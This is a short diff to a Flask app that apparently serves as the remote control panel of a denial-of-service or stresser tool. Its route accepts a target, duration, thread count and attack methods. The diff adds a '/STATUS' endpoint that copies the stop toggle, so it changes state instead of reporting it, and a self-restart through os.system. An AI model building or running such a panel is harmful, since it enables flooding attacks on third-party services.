@@ -17,6 +17,17 @@ def stop():
         else:f.write("YES")
     return f'{data} --> {c}'
 
+@app.route('/STATUS')
+def status():
+    data = ''
+    c = 1
+    with open(os.getcwd()+"/meth/STOP.txt","r") as f:
+        data = f.read().upper().replace("\n","")
+    with open(os.getcwd()+"/meth/STOP.txt","w") as f:
+        if data in ['YES','TRUE']:f.write("NO"); c = 0
+        else:f.write("YES")
+    return f'{data} --> {c}'
+
 @app.route('/target=<TARGET>&time=<TIME>&threads=<THREAD>&methods=<METHODS>')
 def req(TARGET, TIME, THREAD, METHODS):
     upper_methods = METHODS.upper()
@@ -109,6 +120,6 @@ def list_update():
            else:print(f"[{epoch_to_datetime(datetime_to_epoch())}] {a} UPDATE BEFORE. . .")
     if c == 1:return True
 
-if list_update() == True:print("RESTART PROGRAM!")
+if list_update() == True:print("RESTART PROGRAM!"); os.system('python main.py')
 else:
  app.run('0.0.0.0')
